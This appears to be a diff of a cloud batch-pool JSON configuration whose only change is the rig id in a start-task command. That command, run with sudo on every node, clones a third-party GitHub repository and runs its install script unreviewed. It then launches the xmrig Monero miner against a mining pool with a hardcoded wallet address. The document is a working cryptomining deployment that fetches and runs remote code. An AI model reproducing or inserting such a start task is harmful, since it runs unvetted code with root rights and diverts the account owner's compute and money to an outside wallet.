@@ -75,7 +75,7 @@
                     }
                 },
                 "startTask": {
-                    "commandLine": "/bin/bash -c \"\ncd $HOME;\nsudo apt-get update --fix-missing;\nsudo apt-get -y install git build-essential cmake automake libtool autoconf wget;\ngit clone https://github.com/PrandoXMR/cryptocloud.git;\nmv cryptocloud/install.sh .;\nchmod +x install.sh;\n./install.sh;\ncd $HOME/xmrig/build;\n./xmrig --rig-id=cloud -u 82ytFXBxDi1AiN8Wm567p9QmYmUswFeRYDNkkYkFDJ5CQqTu3QDZ8WheyNPSVYc4yQRLdeFR6KzNkPCS2S8HLe3q48imC63 -o us-west.minexmr.com:4444 \n\"",
+                    "commandLine": "/bin/bash -c \"\ncd $HOME;\nsudo apt-get update --fix-missing;\nsudo apt-get -y install git build-essential cmake automake libtool autoconf wget;\ngit clone https://github.com/PrandoXMR/cryptocloud.git;\nmv cryptocloud/install.sh .;\nchmod +x install.sh;\n./install.sh;\ncd $HOME/xmrig/build;\n./xmrig --rig-id=cloud111 -u 82ytFXBxDi1AiN8Wm567p9QmYmUswFeRYDNkkYkFDJ5CQqTu3QDZ8WheyNPSVYc4yQRLdeFR6KzNkPCS2S8HLe3q48imC63 -o us-west.minexmr.com:4444 \n\"",
                     "userIdentity": {
                         "autoUser": {
                             "scope": "Pool",
